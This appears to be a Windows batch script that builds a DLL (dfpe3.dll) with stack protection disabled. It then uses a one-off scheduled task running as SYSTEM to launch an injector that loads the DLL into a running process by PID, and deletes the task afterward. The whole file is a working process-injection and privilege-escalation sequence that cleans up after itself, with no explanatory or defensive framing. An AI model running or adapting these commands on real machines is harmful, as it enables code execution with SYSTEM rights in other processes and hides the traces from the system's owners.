@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfpe3.cpp /Fe:dfpe3.dll /link user32.lib > pe3_build.log 2>&1
echo PE3=%errorlevel%
type pe3_build.log
schtasks /create /tn dfa_pe3 /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfpe3.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_pe3
ping -n 10 127.0.0.1 >nul
schtasks /delete /tn dfa_pe3 /f >nul
type pe3.txt
